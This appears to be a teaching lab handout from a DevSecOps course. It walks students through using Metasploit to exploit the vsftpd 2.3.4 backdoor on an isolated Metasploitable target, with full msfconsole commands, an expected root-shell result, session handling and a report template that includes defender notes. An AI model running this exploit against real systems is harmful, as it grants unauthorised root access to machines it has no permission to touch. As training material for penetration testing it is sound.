# Lab 7: Metasploit Basics
### Run a known exploit against the lab Metasploitable target
**DevSecOps — Module 7 of 9**

---

## Lab overview

### Objectives

- Launch and navigate `msfconsole` (via the official Docker image on Cloud9)
- Search, configure, and run an exploit module
- Land a session and run basic commands as evidence

### Prerequisites

- Lab 1 completed; `metasploitable-<your-name>` running on the `devsecops-lab` network

> ⏱ **Duration:** ~30 minutes
> 👥 **Pair:** No

---

## Step 1: Start `msfconsole` (in a container)

Run the official Metasploit image with a host-mounted workspace so you keep loot/notes after the container exits:

```bash
mkdir -p ~/environment/devsecops-work/msf

docker run --rm -it \
  --name msf-${USER} \
  --network devsecops-lab \
  -v $HOME/environment/devsecops-work/msf:/home/msf \
  metasploitframework/metasploit-framework:latest \
  ./msfconsole -q
```

The `-q` skips the banner. You'll land at:

```
msf6 >
```

Useful first commands:

```text
msf6 > version            # confirm install
msf6 > help               # cheat-sheet
```

> 💡 The container doesn't run a database, so `db_nmap`, `workspace`, `hosts`, `services` will report **"Database not connected"**. We don't need them — the exploit works with just a target hostname.

---

## Step 2: Verify the target is reachable

The target's network alias is `metasploitable` (set by the Lab 1 setup script). The container is on the same Docker network, so the name resolves:

```text
msf6 > ping -c 1 metasploitable
```

You should see `1 packets transmitted, 1 received`.

---

## Step 3: Pick the friendly first exploit

The `vsftpd 2.3.4` daemon shipped with a known backdoor — easiest, most predictable first run.

```text
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > info
msf6 exploit(vsftpd_234_backdoor) > show options
```

`info` is your friend — what it does, target platforms, options that matter.

---

## Step 4: Configure & run

```text
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS metasploitable
msf6 exploit(vsftpd_234_backdoor) > check         # safe, non-exploiting probe
msf6 exploit(vsftpd_234_backdoor) > run
```

Expected outcome:

```
[+] metasploitable:21 - Backdoor service has been spawned, handling...
[+] metasploitable:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
```

> ✅ **Checkpoint:** you have a `Command shell session` open as `root`.

---

## Step 5: Capture evidence

Inside the session:

```text
id
hostname
uname -a
ls -la /root
```

Don't read sensitive files; this is a lab, but practise the habit.

Capture by selecting → copying terminal output, paste into `~/environment/devsecops-work/lab7-evidence.txt`.

---

## Step 6: Background and inspect the session

```text
^Z       (or type "background")
[*] Backgrounding session 1...

msf6 exploit(vsftpd_234_backdoor) > sessions
msf6 exploit(vsftpd_234_backdoor) > sessions -i 1     # re-attach
^Z
msf6 exploit(vsftpd_234_backdoor) > sessions -k 1     # kill it
```

Practise these — everyday vocabulary.

---

## Step 7: Try `local_exploit_suggester` (optional, 5 min)

```text
msf6 > sessions
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(local_exploit_suggester) > set SESSION 1
msf6 post(local_exploit_suggester) > run
```

> 🛑 **Do not run any suggested escalation module.** Out of scope. The suggester is information; pivoting is not in scope.

---

## Step 8: Lab-7 report

Save `~/environment/devsecops-work/lab7-report.md`:

```markdown
# Lab 7 — Metasploit basics

**Tester:** <your name>
**Target:** metasploitable (lab network)
**Module:** exploit/unix/ftp/vsftpd_234_backdoor

## Outcome
Session opened as root. Evidence captured.

## Commands & options
- RHOSTS = metasploitable
- run

## Evidence
\`\`\`
<paste your captured terminal>
\`\`\`

## Defender's view
- This module is detected by most modern EDR signatures
- A patched vsftpd (≥ 2.3.5) closes the backdoor
- An IDS rule matching the magic ":)" username trigger would catch it
```

---

## Cleanup

```text
msf6 > sessions -K        # kill all sessions
msf6 > exit
```

The Metasploit container exits with `--rm`. Targets stay running.

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| Container exits with "TTY required" | Make sure you used `-it` flags |
| `Postgresql connection refused` | Inside container: `msfdb init && msfdb start` |
| `db_nmap` says "host appears to be down" | Confirm `--network devsecops-lab` was passed |
| Exploit `run` "completed, no session" | Re-check the alias; `ping metasploitable` from inside the container |
| Session opens but disconnects immediately | Re-run; vsftpd backdoor occasionally needs a second attempt |
